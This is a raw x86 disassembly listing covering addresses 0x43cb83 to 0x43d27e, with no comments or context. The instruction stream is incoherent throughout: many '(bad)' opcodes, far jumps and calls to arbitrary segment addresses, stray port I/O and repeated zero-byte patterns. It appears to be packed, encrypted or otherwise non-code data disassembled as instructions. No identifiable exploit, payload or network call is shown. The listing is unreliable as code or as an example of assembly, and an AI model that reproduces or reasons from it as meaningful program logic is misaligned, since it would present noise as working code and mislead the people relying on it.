  43cb83:	xchg   esp,ecx
  43cb85:	call   0xcaf69c0d
  43cb8a:	or     ecx,DWORD PTR [eax-0x3]
  43cb8d:	test   DWORD PTR [ebx],0xdb88ad90
  43cb93:	or     dh,al
  43cb95:	pop    ebx
  43cb96:	jmp    0x43cbef
  43cb98:	mov    ch,0x50
  43cb9a:	(bad)  
  43cb9b:	jno    0x43cbc6
  43cb9d:	xor    eax,0x356b455e
  43cba2:	mov    dh,cl
  43cba4:	(bad)  
  43cba5:	adc    cl,BYTE PTR [edi]
  43cba7:	add    DWORD PTR [ecx+ebx*4-0x1538f878],esi
  43cbae:	add    bh,0x82
  43cbb1:	mov    dl,BYTE PTR [edx]
  43cbb3:	mov    DWORD PTR ds:0x3a2d01b7,eax
  43cbb9:	nop
  43cbba:	ja     0x43cb4f
  43cbbc:	xor    DWORD PTR [eax],edx
  43cbbe:	pop    ebx
  43cbbf:	add    BYTE PTR [eax],al
  43cbc1:	add    BYTE PTR [eax],al
  43cbc3:	add    BYTE PTR [ebx],ah
  43cbc5:	mov    bh,0xe
  43cbc7:	or     eax,0xecf7b290
  43cbcc:	sbb    eax,0xb503f7b2
  43cbd1:	jb     0x43cc11
  43cbd3:	or     al,0xf2
  43cbd5:	sub    esi,esi
  43cbd7:	pop    ebx
  43cbd8:	xor    eax,0x12da6ce1
  43cbdd:	imul   ebp,DWORD PTR [esp+edi*2],0xffffff99
  43cbe1:	add    eax,0x721365f7
  43cbe6:	sub    al,0x74
  43cbe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cbe9:	pusha  
  43cbea:	add    DWORD PTR [ecx+0x34b03145],ecx
  43cbf0:	ret    
  43cbf1:	mov    eax,ds:0xb07eb4f8
  43cbf6:	je     0x43cbf4
  43cbf8:	mov    edi,0x2780f2c6
  43cbfd:	(bad)  
  43cbff:	push   es
  43cc00:	scas   al,BYTE PTR es:[edi]
  43cc01:	mov    dh,0x8
  43cc03:	add    DWORD PTR [ecx-0x19],ecx
  43cc06:	push   cs
  43cc07:	pop    ds
  43cc08:	stos   BYTE PTR es:[edi],al
  43cc09:	mov    cl,0x4b
  43cc0b:	fiadd  WORD PTR [esp+ecx*4-0x65]
  43cc0f:	scas   eax,DWORD PTR es:[edi]
  43cc10:	jecxz  0x43cbe4
  43cc12:	lea    esp,[ecx-0x75]
  43cc15:	ret    
  43cc16:	push   ss
  43cc17:	sub    dl,dh
  43cc19:	mov    al,0x9b
  43cc1b:	stos   DWORD PTR es:[edi],eax
  43cc1c:	ret    
  43cc1d:	push   ebp
  43cc1e:	or     DWORD PTR [esi+ecx*2-0x5],esi
  43cc22:	jo     0x43cc26
  43cc24:	xlat   BYTE PTR ds:[ebx]
  43cc25:	rcl    DWORD PTR [esi],0x28
  43cc28:	add    BYTE PTR [eax],al
  43cc2a:	add    BYTE PTR [eax],al
  43cc2c:	add    dl,dh
  43cc2e:	mov    al,0x9b
  43cc30:	stos   DWORD PTR es:[edi],eax
  43cc31:	ficom  DWORD PTR [ebp+0x19]
  43cc34:	je     0x43cc84
  43cc36:	sbb    esi,DWORD PTR [ecx-0x1e]
  43cc39:	(bad)  
  43cc3a:	sar    esi,0x27
  43cc3d:	mov    dl,0xb0
  43cc3f:	fwait
  43cc40:	stos   DWORD PTR es:[edi],eax
  43cc41:	cli    
  43cc42:	cmp    eax,0x6cdcf6d4
  43cc47:	mov    gs,WORD PTR [eax]
  43cc49:	xchg   edx,eax
  43cc4a:	push   edi
  43cc4b:	ror    DWORD PTR [edi-0x73b6bcf2],cl
  43cc51:	pop    es
  43cc52:	lea    esi,ds:[esi+0x3ed23592]
  43cc59:	div    BYTE PTR [ebx]
  43cc5b:	(bad)  
  43cc5c:	xor    DWORD PTR [ecx-0x71],edx
  43cc5f:	into   
  43cc60:	inc    ebx
  43cc61:	pushf  
  43cc62:	rcl    BYTE PTR [edi-0x321a3416],1
  43cc68:	push   ss
  43cc69:	or     DWORD PTR [esi-0x6c],eax
  43cc6c:	mov    al,ds:0x7619dddf
  43cc71:	xchg   edx,eax
  43cc72:	rcl    BYTE PTR [ebx+0x1de5bfa9],1
  43cc78:	mov    ebx,0x6add35e5
  43cc7d:	cmp    ecx,DWORD PTR [ecx+0x3cb9e463]
  43cc83:	dec    esp
  43cc84:	add    BYTE PTR [edx],al
  43cc86:	mov    ch,0x6b
  43cc88:	clc    
  43cc89:	inc    edx
  43cc8a:	(bad)
  43cc8d:	call   0xae0a43
  43cc92:	add    BYTE PTR [eax],al
  43cc94:	add    BYTE PTR [eax],al
  43cc96:	dec    ecx
  43cc97:	(bad)  
  43cc99:	adc    al,0xd7
  43cc9b:	xor    ah,dl
  43cc9d:	cmp    esi,esp
  43cc9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cca0:	jae    0x43cc74
  43cca2:	repz xor ch,BYTE PTR [eax+edx*8-0x48e88e06]
  43ccaa:	mov    DWORD PTR [edx],esi
  43ccac:	test   eax,0xe906ee02
  43ccb1:	gs loop 0x43cd28
  43ccb4:	jnp    0x43cc9a
  43ccb6:	sbb    al,0xd6
  43ccb8:	(bad)  
  43ccb9:	shl    BYTE PTR ds:0xa8ce6bb3,0x2a
  43ccc0:	aam    0xf7
  43ccc2:	sub    BYTE PTR [edx],0xd0
  43ccc5:	cmovbe esp,DWORD PTR [ecx+0x17]
  43ccc9:	mov    bh,0x60
  43cccb:	xchg   ebx,eax
  43cccc:	call   0x93a4c0df
  43ccd1:	(bad)  
  43ccd2:	call   ebp
  43ccd4:	xchg   ecx,eax
  43ccd5:	pop    ss
  43ccd6:	push   ds
  43ccd7:	jb     0x43cd14
  43ccd9:	shl    bl,0xae
  43ccdc:	ins    BYTE PTR es:[edi],dx
  43ccdd:	mov    DWORD PTR [esi-0x29],esi
  43cce0:	inc    edi
  43cce1:	ret    
  43cce2:	mov    ah,0x2b
  43cce4:	not    BYTE PTR [ecx-0x58]
  43cce7:	jecxz  0x43cd24
  43cce9:	fisttp DWORD PTR [edx+0x79fc4d29]
  43ccef:	jecxz  0x43cd61
  43ccf1:	add    al,0x7a
  43ccf3:	jecxz  0x43cd50
  43ccf5:	inc    DWORD PTR [esi+ebp*4+0x176]
  43ccfc:	add    BYTE PTR [eax],al
  43ccfe:	add    BYTE PTR [ecx],bh
  43cd00:	scas   eax,DWORD PTR es:[edi]
  43cd01:	mov    ?,edi
  43cd03:	inc    esp
  43cd04:	(bad)  
  43cd06:	aas    
  43cd07:	nop
  43cd08:	dec    ecx
  43cd09:	(bad)  
  43cd0a:	mov    edi,0x853c86a5
  43cd0f:	and    eax,eax
  43cd11:	aas    
  43cd12:	or     al,0xc1
  43cd14:	call   0x47c:0x4daa0278
  43cd1b:	imul   esi,DWORD PTR [ecx],0xd406bf36
  43cd21:	xchg   edi,eax
  43cd22:	inc    edx
  43cd23:	clc    
  43cd24:	clc    
  43cd25:	xchg   esi,eax
  43cd26:	inc    edx
  43cd27:	mov    cl,bh
  43cd29:	inc    eax
  43cd2a:	xchg   bx,ax
  43cd2c:	clc    
  43cd2d:	inc    eax
  43cd2e:	dec    ebp
  43cd2f:	out    0xfd,eax
  43cd31:	adc    ecx,edi
  43cd33:	gs jge 0x43cd1b
  43cd36:	adc    al,BYTE PTR [eax+0x59]
  43cd39:	dec    esi
  43cd3a:	add    BYTE PTR ds:0xc7095f89,dl
  43cd40:	sbb    eax,0xfda5f916
  43cd45:	std    
  43cd46:	aas    
  43cd47:	nop
  43cd48:	enter  0xf867,0x91
  43cd4c:	and    eax,0xb3134216
  43cd51:	outs   dx,BYTE PTR ds:[esi]
  43cd52:	outs   dx,BYTE PTR ds:[esi]
  43cd53:	fcomp  QWORD PTR [edi+0x4491ad10]
  43cd59:	pop    edi
  43cd5a:	cld    
  43cd5b:	(bad)  
  43cd5c:	pop    edi
  43cd5d:	inc    edx
  43cd5e:	adc    al,dl
  43cd60:	dec    ebx
  43cd61:	dec    eax
  43cd62:	xchg   BYTE PTR [eax],al
  43cd64:	add    BYTE PTR [eax],al
  43cd66:	add    BYTE PTR [eax],al
  43cd68:	push   ebx
  43cd69:	cmc    
  43cd6a:	fstp   TBYTE PTR [ebp-0x74c0b460]
  43cd70:	cld    
  43cd71:	scas   eax,DWORD PTR es:[edi]
  43cd72:	call   0x9000:0x141c747e
  43cd79:	(bad)  
  43cd7a:	mov    fs,WORD PTR [edi+0x4ce50155]
  43cd80:	out    0x9b,al
  43cd82:	and    ebp,edx
  43cd84:	jecxz  0x43cd38
  43cd86:	and    al,0x6e
  43cd88:	je     0x43cd6f
  43cd8a:	pop    esp
  43cd8b:	hlt    
  43cd8c:	cmp    BYTE PTR [eax-0x4d2fe8e5],ah
  43cd92:	jb     0x43cd57
  43cd94:	mov    ds:0xcd13fd7e,eax
  43cd99:	loopne 0x43ce03
  43cd9b:	adc    BYTE PTR [eax-0x72fbc860],dh
  43cda1:	outs   dx,BYTE PTR ds:[esi]
  43cda2:	int3   
  43cda3:	pop    ecx
  43cda4:	push   cs
  43cda5:	jbe    0x43cd74
  43cda7:	xchg   dl,dl
  43cda9:	mov    edx,0x300ac61e
  43cdae:	nop
  43cdaf:	clc    
  43cdb0:	call   0x833e75ee
  43cdb5:	pop    edx
  43cdb6:	lds    eax,FWORD PTR [ebx-0x70]
  43cdb9:	daa    
  43cdba:	jae    0x43cd67
  43cdbc:	fidivr DWORD PTR [ecx]
  43cdbe:	and    DWORD PTR [ebx-0x37],edx
  43cdc1:	lahf   
  43cdc2:	jnp    0x43cdda
  43cdc4:	push   eax
  43cdc5:	mov    dl,0x7a
  43cdc7:	ret    
  43cdc8:	inc    ebx
  43cdc9:	data16 jnp 0x43cd4c
  43cdcc:	add    BYTE PTR [eax],al
  43cdce:	add    BYTE PTR [eax],al
  43cdd0:	add    bh,ch
  43cdd2:	aaa    
  43cdd3:	add    edx,edi
  43cdd5:	pop    edi
  43cdd6:	cmp    ebx,esp
  43cdd8:	addr16 xchg ebp,eax
  43cdda:	repnz test DWORD PTR [eax+0x5f7e0252],0xab7b2740
  43cde5:	mov    bh,BYTE PTR [ecx]
  43cde7:	stc    
  43cde8:	push   edx
  43cde9:	mov    DWORD PTR [edi-0x4d2fe9ed],ebx
  43cdef:	jb     0x43cdb5
  43cdf1:	add    edi,ecx
  43cdf3:	pop    ecx
  43cdf4:	test   edx,ebp
  43cdf6:	outs   dx,BYTE PTR ds:[esi]
  43cdf7:	cmp    eax,0xb785076f
  43cdfc:	bound  edx,QWORD PTR [edi]
  43cdfe:	out    dx,eax
  43cdff:	(bad)  
  43ce00:	push   ecx
  43ce01:	or     ebp,edi
  43ce03:	push   cs
  43ce04:	lods   eax,DWORD PTR ds:[esi]
  43ce05:	in     al,0x3b
  43ce07:	add    al,0xa9
  43ce09:	mov    ds:0x546c0ef2,al
  43ce0e:	les    ebx,FWORD PTR [edx-0x7bb06ca6]
  43ce14:	cmp    al,0x1d
  43ce16:	dec    ebp
  43ce17:	mov    es,WORD PTR [ebp-0x1e0547dc]
  43ce1d:	xchg   edx,eax
  43ce1e:	mov    dl,0xe
  43ce20:	pop    ss
  43ce21:	rcl    eax,0xfe
  43ce24:	pop    ss
  43ce25:	pop    ss
  43ce26:	cmc    
  43ce27:	xor    bl,cl
  43ce29:	arpl   WORD PTR [edx-0x7a],cx
  43ce2c:	arpl   dx,di
  43ce2e:	cmp    DWORD PTR [eax],esp
  43ce30:	mov    ch,0x97
  43ce32:	stos   BYTE PTR es:[edi],al
  43ce33:	jo     0x43ce4d
  43ce35:	add    BYTE PTR [eax],al
  43ce37:	add    BYTE PTR [eax],al
  43ce39:	add    BYTE PTR [eax-0x72],al
  43ce3c:	sbb    ch,BYTE PTR [eax]
  43ce3e:	imul   BYTE PTR [eax-0x71b00790]
  43ce44:	sbb    dl,bh
  43ce46:	mov    ebp,0x5063d785
  43ce4b:	lods   eax,DWORD PTR ds:[esi]
  43ce4c:	push   ss
  43ce4d:	stc    
  43ce4e:	xchg   DWORD PTR [esi+0x7284a7fe],ebx
  43ce54:	mov    fs,WORD PTR [eax]
  43ce56:	nop
  43ce57:	stos   DWORD PTR es:[edi],eax
  43ce58:	push   edx
  43ce59:	and    DWORD PTR [esi-0x49],edx
  43ce5c:	in     al,0xe1
  43ce5e:	sbb    eax,0x83ac2851
  43ce63:	mov    esi,0xa226fe2e
  43ce68:	das    
  43ce69:	lods   eax,DWORD PTR ds:[esi]
  43ce6a:	scas   eax,DWORD PTR es:[edi]
  43ce6b:	xchg   esi,eax
  43ce6c:	fwait
  43ce6d:	popf   
  43ce6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ce6f:	xchg   esi,eax
  43ce70:	test   BYTE PTR [ecx+0x48],0x3a
  43ce74:	jmp    0x8443:0x168eb76c
  43ce7b:	loop   0x43ce18
  43ce7d:	sbb    eax,0xf692b0
  43ce82:	fldcw  WORD PTR [edi-0x18]
  43ce85:	jmp    DWORD PTR [esi+0x2]
  43ce88:	dec    ebp
  43ce89:	adc    al,0xba
  43ce8b:	dec    ebx
  43ce8c:	jmp    0x810c:0x62e68e73
  43ce93:	(bad)  
  43ce94:	or     DWORD PTR [edx+0x2a12dd],edi
  43ce9a:	xchg   ebx,eax
  43ce9b:	mov    cl,0xf3
  43ce9d:	pop    es
  43ce9e:	add    BYTE PTR [eax],al
  43cea0:	add    BYTE PTR [eax],al
  43cea2:	add    bl,al
  43cea4:	imul   DWORD PTR [esi+0xcc62940]
  43ceaa:	mov    ebx,DWORD PTR [eax+esi*4]
  43cead:	inc    edi
  43ceae:	push   edi
  43ceaf:	jb     0x43cf1a
  43ceb1:	repnz sbb dh,dl
  43ceb4:	inc    eax
  43ceb5:	out    0x8d,eax
  43ceb7:	in     eax,dx
  43ceb8:	mov    ecx,0x788203f3
  43cebd:	sbb    ch,BYTE PTR [edx-0x6f]
  43cec0:	ficom  WORD PTR [ebp+0x3e9e8d44]
  43cec6:	(bad)  
  43cec7:	mov    esp,0xe93ffff7
  43cecc:	fiadd  DWORD PTR [ebx+ecx*4+0x5c]
  43ced0:	loopne 0x43ce7a
  43ced2:	adc    BYTE PTR [ecx-0x7a332991],bh
  43ced8:	outs   dx,DWORD PTR ds:[esi]
  43ced9:	(bad)  
  43ceda:	int3   
  43cedb:	outs   dx,DWORD PTR gs:[esi]
  43cedd:	(bad)  
  43cede:	int3   
  43cedf:	in     al,dx
  43cee0:	not    BYTE PTR es:[ebx-0x21]
  43cee4:	loop   0x43ce79
  43cee6:	jge    0x43ce89
  43cee8:	jle    0x43cead
  43ceea:	cmp    edx,DWORD PTR [edx+0xe8b62c7]
  43cef0:	mov    al,ds:0xd0fdf323
  43cef5:	and    DWORD PTR [edi-0x77],ebx
  43cef8:	ret    0x3976
  43cefb:	mov    dh,0x92
  43cefd:	bound  esp,QWORD PTR [ebx-0x70]
  43cf00:	rol    BYTE PTR [ecx+0x14],cl
  43cf03:	sbb    DWORD PTR [eax+0x871a],ecx
  43cf09:	add    BYTE PTR [eax],al
  43cf0b:	add    BYTE PTR [edi-0x5bbf56af],bh
  43cf11:	dec    ebx
  43cf12:	push   cs
  43cf13:	add    BYTE PTR [eax+0x190828d4],dl
  43cf19:	pop    DWORD PTR [edx]
  43cf1b:	test   esi,edx
  43cf1d:	mov    cl,0x9b
  43cf1f:	pop    ecx
  43cf20:	pushf  
  43cf21:	push   esp
  43cf22:	int    0x7a
  43cf24:	xchg   ebp,eax
  43cf25:	sbb    bl,cl
  43cf27:	xchg   dh,cl
  43cf29:	inc    ecx
  43cf2a:	xchg   ebp,eax
  43cf2b:	inc    ecx
  43cf2c:	js     0x43cef2
  43cf2e:	(bad)  
  43cf30:	cmp    DWORD PTR [ebx+ebx*8+0x7c],edx
  43cf34:	icebp  
  43cf35:	cmp    DWORD PTR ds:0x3d39d17d,0x3d454e87
  43cf3f:	jge    0x43cf39
  43cf41:	dec    edx
  43cf42:	pop    edi
  43cf43:	add    eax,edi
  43cf45:	lods   al,BYTE PTR ds:[esi]
  43cf46:	jno    0x43cf48
  43cf48:	nop
  43cf49:	hlt    
  43cf4a:	psubsb mm4,mm5
  43cf4d:	popa   
  43cf4e:	push   cs
  43cf4f:	add    BYTE PTR [ecx],cl
  43cf51:	adc    BYTE PTR [esi],bl
  43cf53:	push   edx
  43cf54:	sbb    DWORD PTR [edi],ebx
  43cf56:	ss call 0x523a85
  43cf5c:	adc    eax,DWORD PTR [ebp+0x5c56590e]
  43cf62:	into   
  43cf63:	push   esp
  43cf64:	dec    ebp
  43cf65:	mov    ecx,DWORD PTR [esi]
  43cf67:	add    BYTE PTR [edi+0x7],al
  43cf6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cf6b:	stc    
  43cf6c:	lahf   
  43cf6d:	scas   eax,DWORD PTR es:[edi]
  43cf6e:	loope  0x43cfc4
  43cf70:	add    BYTE PTR [eax],al
  43cf72:	add    BYTE PTR [eax],al
  43cf74:	add    BYTE PTR ds:0x5c000e8b,dh
  43cf7a:	push   ss
  43cf7b:	xchg   ebp,eax
  43cf7c:	outs   dx,DWORD PTR ds:[esi]
  43cf7d:	cwde   
  43cf7e:	sbb    al,0x95
  43cf80:	ja     0x43cf26
  43cf82:	mov    dl,0x5c
  43cf84:	aam    0x36
  43cf86:	dec    ecx
  43cf87:	loopne 0x43cf14
  43cf89:	xor    DWORD PTR [esp+ebp*2+0x7b],0xffffff98
  43cf8e:	hlt    
  43cf8f:	test   BYTE PTR [ebx],0x90
  43cf92:	mov    dl,0xf6
  43cf94:	jae    0x43d012
  43cf96:	sub    DWORD PTR [eax],ecx
  43cf98:	adc    BYTE PTR [eax],bl
  43cf9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cf9b:	fld    QWORD PTR [eax+eax*8]
  43cf9e:	sahf   
  43cf9f:	sbb    BYTE PTR [esi-0x3],dl
  43cfa2:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cfa4:	(bad)  
  43cfa5:	dec    ebx
  43cfa6:	addr16 mov esp,0x25675bc7
  43cfac:	mov    ecx,eax
  43cfae:	xchg   esi,eax
  43cfaf:	and    DWORD PTR [ebx+0x28],edx
  43cfb2:	xor    BYTE PTR [edx],bl
  43cfb4:	add    al,0x90
  43cfb6:	sub    ebp,esp
  43cfb8:	unpckhps xmm5,xmm6
  43cfbb:	mov    DWORD PTR [edx-0xc63512d],0xf35cb081
  43cfc5:	adc    bh,BYTE PTR ds:0xf2152bc4
  43cfcb:	out    0x8a,eax
  43cfcd:	pop    eax
  43cfce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cfcf:	mov    eax,ds:0x3c4a4f53
  43cfd4:	gs nop
  43cfd6:	mov    dl,0xf6
  43cfd8:	outs   dx,BYTE PTR ds:[esi]
  43cfd9:	add    BYTE PTR [eax],al
  43cfdb:	add    BYTE PTR [eax],al
  43cfdd:	add    BYTE PTR [ebx+esi*4-0x4338ec5c],bl
  43cfe4:	ret    
  43cfe5:	sub    al,0x41
  43cfe7:	mov    ds:0x8b8bbf74,al
  43cfec:	test   BYTE PTR [edi],cl
  43cfee:	and    ebp,DWORD PTR [esp+ebp*2-0x5ad467ae]
  43cff5:	adc    edi,DWORD PTR [edx]
  43cff7:	fnstenv [edi+eax*8]
  43cffa:	retf   
  43cffb:	data16 cmp al,0xc7
  43cffe:	pop    ebx
  43cfff:	data16 setl BYTE PTR [edx]
  43d003:	dec    ecx
  43d004:	inc    ecx
  43d005:	bound  eax,QWORD PTR [eax]
  43d007:	stos   DWORD PTR es:[edi],eax
  43d008:	xchg   ebx,eax
  43d009:	fisttp WORD PTR [ebp-0x6c1632d2]
  43d00f:	mov    dl,0x95
  43d011:	das    
  43d012:	mov    BYTE PTR [ecx],dh
  43d014:	iret   
  43d015:	(bad)  
  43d017:	add    cl,BYTE PTR [edi]
  43d019:	jmp    0x41d9b3b1
  43d01e:	nop
  43d01f:	mov    bh,0xe9
  43d021:	add    eax,eax
  43d023:	xchg   BYTE PTR [ebp+0x31be7fae],cl
  43d029:	push   0x3d
  43d02b:	in     al,dx
  43d02c:	(bad)  
  43d02d:	retf   
  43d02e:	adc    BYTE PTR [edx],bh
  43d030:	inc    esi
  43d031:	sbb    eax,0x6e9b77f
  43d036:	mov    al,ds:0xa3868d9a
  43d03b:	mov    esi,0x1f0567fd
  43d040:	or     eax,0xe9
  43d045:	add    BYTE PTR [eax],al
  43d047:	xchg   ebx,eax
  43d048:	mov    esi,0x3b3c0e15
  43d04d:	jmp    0x902b:0x4bdafd66
  43d054:	mov    dl,0x95
  43d056:	test   eax,0xd5cf319b
  43d05b:	xchg   esi,eax
  43d05c:	das    
  43d05d:	pop    ecx
  43d05e:	or     eax,0x11512f3c
  43d063:	fs cmp eax,eax
  43d066:	push   0xffffffd0
  43d068:	lods   al,BYTE PTR ds:[esi]
  43d069:	xchg   ebp,eax
  43d06a:	xchg   edi,eax
  43d06b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d06c:	das    
  43d06d:	dec    ebp
  43d06e:	lods   eax,DWORD PTR ds:[esi]
  43d06f:	ss cmc 
  43d071:	(bad)  
  43d072:	in     al,dx
  43d073:	sbb    bl,ch
  43d075:	xor    bh,BYTE PTR [ecx-0x46c90ce8]
  43d07b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d07c:	arpl   WORD PTR [esi-0x6c599b00],cx
  43d082:	push   esi
  43d083:	ins    DWORD PTR es:[edi],dx
  43d084:	sub    ebp,DWORD PTR [eax+eax*2]
  43d087:	hlt    
  43d088:	outs   dx,BYTE PTR ds:[esi]
  43d089:	pop    esi
  43d08a:	or     eax,0x5032ecf2
  43d08f:	add    dh,BYTE PTR [esi+0x36]
  43d092:	push   eax
  43d093:	dec    esi
  43d094:	popa   
  43d095:	imul   eax,esp,0x71
  43d098:	sub    eax,DWORD PTR [eax+0x1c]
  43d09b:	repnz icebp 
  43d09d:	test   DWORD PTR es:[ecx],ebp
  43d0a0:	les    edx,FWORD PTR ds:0x3e927f8b
  43d0a6:	mov    esi,DWORD PTR [edi-0x7a]
  43d0a9:	inc    DWORD PTR ds:[eax]
  43d0ac:	add    BYTE PTR [eax],al
  43d0ae:	add    BYTE PTR [eax],al
  43d0b0:	sbb    BYTE PTR [ebx],dh
  43d0b2:	into   
  43d0b3:	or     dl,al
  43d0b5:	in     eax,0xa
  43d0b7:	mov    esi,DWORD PTR [edi-0x7a]
  43d0ba:	xchg   ebx,eax
  43d0bb:	dec    esi
  43d0bc:	push   ebp
  43d0bd:	loop   0x43d0fd
  43d0bf:	(bad)  
  43d0c0:	fdiv   DWORD PTR [edx]
  43d0c2:	into   
  43d0c3:	or     dl,bl
  43d0c5:	outs   dx,DWORD PTR ds:[esi]
  43d0c6:	imul   edi,edi,0x8
  43d0c9:	scas   eax,DWORD PTR es:[edi]
  43d0ca:	jge    0x43d08c
  43d0cc:	sahf   
  43d0cd:	cmc    
  43d0ce:	dec    edi
  43d0cf:	sbb    al,0xe9
  43d0d1:	scas   eax,DWORD PTR es:[edi]
  43d0d2:	push   cs
  43d0d3:	add    bh,cl
  43d0d5:	out    0x6b,eax
  43d0d7:	loopne 0x43d125
  43d0d9:	fsubr  QWORD PTR [eax-0x180806fc]
  43d0df:	dec    DWORD PTR [esi+0x3e]
  43d0e2:	dec    eax
  43d0e3:	pop    ebp
  43d0e4:	stos   DWORD PTR es:[edi],eax
  43d0e5:	xor    ebp,edx
  43d0e7:	retf   
  43d0e8:	jge    0x43d155
  43d0ea:	(bad)  
  43d0eb:	int3   
  43d0ec:	xor    dh,BYTE PTR [ebp+0x12]
  43d0ef:	push   edi
  43d0f0:	xor    dh,BYTE PTR [edi]
  43d0f2:	and    edi,ecx
  43d0f4:	pop    ss
  43d0f5:	mov    dl,0x93
  43d0f7:	stc    
  43d0f8:	xor    al,0x3e
  43d0fa:	pop    ebp
  43d0fb:	add    al,0x90
  43d0fd:	pop    eax
  43d0fe:	into   
  43d0ff:	pop    eax
  43d100:	shl    DWORD PTR [eax-0x55],cl
  43d103:	xchg   BYTE PTR [esi+0x45],cl
  43d106:	xchg   edi,eax
  43d107:	add    edi,esp
  43d109:	sbb    DWORD PTR [edi],edi
  43d10b:	call   0x51ff35
  43d110:	or     edx,DWORD PTR [ebx]
  43d112:	add    al,BYTE PTR [ebp+0x0]
  43d118:	add    cl,dl
  43d11a:	mov    cl,0x91
  43d11c:	ret    
  43d11d:	pushf  
  43d11e:	enter  0xfefa,0xdc
  43d122:	xor    al,0x69
  43d124:	push   ecx
  43d125:	mov    al,ds:0x684e417c
  43d12a:	xor    eax,0x4a900046
  43d12f:	and    bh,bh
  43d131:	lds    edx,FWORD PTR [ecx+0x6b]
  43d134:	inc    ecx
  43d135:	adc    al,0xd5
  43d138:	pop    eax
  43d139:	push   ebx
  43d13a:	enter  0xfdfa,0xa4
  43d13e:	inc    ebx
  43d13f:	imul   eax,DWORD PTR [ecx+0x60],0x28504174
  43d146:	xchg   ecx,eax
  43d147:	outs   dx,DWORD PTR ds:[esi]
  43d148:	add    BYTE PTR [eax-0x6ecfab3e],dl
  43d14e:	repz adc bh,BYTE PTR [edx-0x68]
  43d152:	rcl    ch,1
  43d154:	pop    eax
  43d155:	rcl    DWORD PTR [edi+ecx*8],cl
  43d158:	retf   
  43d159:	les    edi,FWORD PTR [esi+ecx*8-0x35]
  43d15d:	fadd   QWORD PTR [esi+ecx*8+0x54cfd4cb]
  43d164:	sub    al,0xb
  43d166:	adc    ebp,DWORD PTR [edx]
  43d168:	test   DWORD PTR [esi],edi
  43d16a:	add    eax,0xb19c011
  43d16f:	cmp    ch,BYTE PTR ds:0x436b62d0
  43d175:	dec    edx
  43d176:	sub    DWORD PTR [ecx+0x49],0x44
  43d17a:	mov    dl,0x5c
  43d17c:	dec    edx
  43d17d:	add    BYTE PTR [eax],al
  43d17f:	add    BYTE PTR [eax],al
  43d181:	add    BYTE PTR [ebp+eiz*1-0x5c],dl
  43d185:	cld    
  43d186:	test   eax,0x55dba7df
  43d18b:	(bad)
  43d18e:	or     eax,0x90047c2c
  43d193:	mov    dl,0x7a
  43d195:	or     al,dl
  43d197:	mov    ch,0x37
  43d199:	add    eax,DWORD PTR [ecx+0x3f]
  43d19c:	clc    
  43d19d:	mov    ch,0x9e
  43d19f:	jb     0x43d198
  43d1a1:	push   es
  43d1a2:	push   eax
  43d1a3:	cmp    al,0x7a
  43d1a5:	and    DWORD PTR [edi+0x32],0xfffffff8
  43d1a9:	add    ah,BYTE PTR [ecx]
  43d1ab:	inc    ebx
  43d1ac:	mov    BYTE PTR [eax+edx*8],cl
  43d1af:	mov    dl,0x5e
  43d1b1:	cdq    
  43d1b2:	sbb    esi,DWORD PTR [ebx+0x699903f7]
  43d1b8:	jo     0x43d171
  43d1ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d1bb:	jb     0x43d1b4
  43d1bd:	jl     0x43d1c8
  43d1bf:	inc    ebx
  43d1c0:	clc    
  43d1c1:	add    edx,DWORD PTR [eax-0x1e6cbf3f]
  43d1c7:	retf   
  43d1c8:	aaa    
  43d1c9:	add    al,0x9d
  43d1cb:	imul   bh
  43d1cd:	ss push eax
  43d1cf:	ins    BYTE PTR es:[edi],dx
  43d1d0:	test   BYTE PTR [ebx],0x90
  43d1d3:	mov    dl,0x5e
  43d1d5:	pop    ecx
  43d1d6:	test   BYTE PTR [ebx],bh
  43d1d8:	cmp    ah,BYTE PTR [eax+0x17]
  43d1db:	jns    0x43d1f8
  43d1dd:	jge    0x43d230
  43d1df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d1e0:	pop    esi
  43d1e1:	mov    DWORD PTR [ebx],esp
  43d1e3:	leave  
  43d1e4:	test   DWORD PTR [ebx],0x0
  43d1ea:	add    BYTE PTR [edi],cl
  43d1ec:	cmp    DWORD PTR [edi+0x6e92497c],0xba3b6849
  43d1f6:	cmp    esi,DWORD PTR [edi-0x6ffc25b2]
  43d1fc:	dec    BYTE PTR [esi]
  43d1fe:	pushf  
  43d1ff:	ds sbb eax,0x8a369a40
  43d205:	cmp    bh,BYTE PTR [edi+0x12ea8c2c]
  43d20b:	cwde   
  43d20c:	aaa    
  43d20d:	jmp    0x6796:0x962e4062
  43d214:	xlat   BYTE PTR ds:[ebx]
  43d215:	popa   
  43d216:	jge    0x43d226
  43d218:	jae    0x43d294
  43d21a:	jb     0x43d1ee
  43d21c:	ficomp WORD PTR [ebx-0x16d881a3]
  43d222:	out    dx,al
  43d223:	adc    esi,0x9f5622de
  43d229:	dec    ebx
  43d22a:	jb     0x43d205
  43d22c:	jmp    0x393f:0xca90643d
  43d233:	xor    al,0x33
  43d235:	jnp    0x43d220
  43d237:	xchg   ebx,eax
  43d238:	aaa    
  43d239:	inc    edx
  43d23a:	sub    eax,0x5272c5
  43d23f:	loope  0x43d1e3
  43d241:	aaa    
  43d242:	push   cs
  43d243:	mov    al,0xaf
  43d245:	shl    ch,cl
  43d247:	mov    cl,BYTE PTR [ebx-0x7d6f93b6]
  43d24d:	jle    0x43d235
  43d24f:	add    BYTE PTR [eax],al
  43d251:	add    BYTE PTR [eax],al
  43d253:	add    al,bl
  43d255:	out    dx,eax
  43d256:	call   0x25730dc5
  43d25b:	stos   BYTE PTR es:[edi],al
  43d25c:	xchg   BYTE PTR [esi+0x2ee5aa35],dh
  43d262:	sbb    eax,0x9794bea9
  43d267:	call   0xb6d9ebea
  43d26c:	push   ebx
  43d26d:	aaa    
  43d26e:	mov    esi,0x7e89906c
  43d273:	out    0x18,al
  43d275:	lock call 0x25728de5
  43d27b:	add    BYTE PTR [edx-0x58],bh
  43d27e:	adc    ch,BYTE PTR [ebx]
